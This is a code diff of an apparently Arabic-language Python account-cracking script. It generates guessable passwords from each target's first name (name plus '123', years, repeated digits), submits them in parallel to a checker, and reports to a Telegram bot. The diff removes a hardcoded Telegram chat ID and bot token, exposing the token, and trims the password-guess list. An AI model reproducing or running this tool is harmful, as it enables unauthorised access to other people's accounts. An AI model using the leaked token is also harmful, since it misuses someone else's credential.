@@ -6,11 +6,10 @@ except ModuleNotFoundError as x:
 	m = str(x).split("'")[1]
 	os.system(f'pip install {m}')
 from concurrent.futures import ThreadPoolExecutor as kil
-chat_id = 5705562178
-bot_token = "6930238082:AAG9y2qDEv7y04PoRzhLSm9BPkbyxT7__Kc"
+
 Id,token = input('\033[2;36m- Enter ID Telegram ~ ادخل ايديك تلجرام : \033[1;97m'),input('\033[2;36m- Enter Token BOT Telegram ~ ادخل توكن البوت : \033[1;97m')
 kopo = requests.get('https://api.telegram.org/bot' + str(token) + '/sendMessage?chat_id=' + str(Id) + '&text=' + str('- Tool Run • تم تشغيل الاداة '))
-webbrowser.open('')
+webbrowser.open('https://t.me/Pythonln')
 if kopo.status_code == 404:
 	exit('\x1b[91;1m\n - Kilwa • ☒ التوكن او الايدي غلط ☒ ')	
 bot = telebot.TeleBot(token,parse_mode='HTML')
@@ -77,7 +76,7 @@ def password():
 		for kk in fid:
 			idf,nmf = kk.split('|')[0],kk.split('|')[1].lower()
 			frs = nmf.split(' ')[0]
-			pwv = [nmf,frs+frs,frs+' '+frs,frs+'123',frs+'12345',frs+'123456',frs+'112233',frs+'11223344',frs+'1122334455',frs+'123456789',frs+'1234567890',frs+'2024',frs+'1122',frs+'1122334455@@',frs+'123@123',frs+'zzzzxxxx',frs+'١٢٣٤٥',frs+'Aa123456',frs+'qqwweerr']
+			pwv = [nmf,frs+frs,frs+' '+frs,frs+'123',frs+'12345',frs+'123456',frs+'2020',frs+'1990',frs+'2003',frs+'2007']
 			kp.submit(checker,idf,pwv)
 
 def checker(idf,pwv):
